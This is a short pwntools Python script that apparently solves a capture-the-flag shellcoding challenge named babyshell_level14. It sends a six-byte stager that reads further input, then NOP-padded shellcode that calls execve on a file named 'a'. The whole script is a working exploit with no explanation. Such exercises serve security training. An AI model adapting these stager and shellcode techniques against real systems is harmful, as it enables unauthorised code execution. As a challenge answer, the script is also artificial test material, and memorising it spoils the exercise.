from pwn import *

context.update(arch="amd64", os="linux")

p = process("/challenge/babyshell_level14")

stager = f'''
.intel_syntax noprefix
.global _start

_start:
    push rax
    pop rdi
    push rdx
    pop rsi
    syscall
'''
stager = asm(stager)
p.readuntil(b"Reading 0x6 bytes from stdin.")
p.write(stager)

shellcode = f'''
.intel_syntax noprefix
.global _start

_start:
    push 0x61
    mov rdi, rsp
    xor esi, esi
    xor edx, edx
    mov al, 0x3b
    syscall
'''
nop = asm(shellcraft.nop())
shellcode = asm(shellcode)
p.readuntil(b"Executing shellcode!")
p.write(nop*6+shellcode)

print(p.readall().decode('utf-8'))

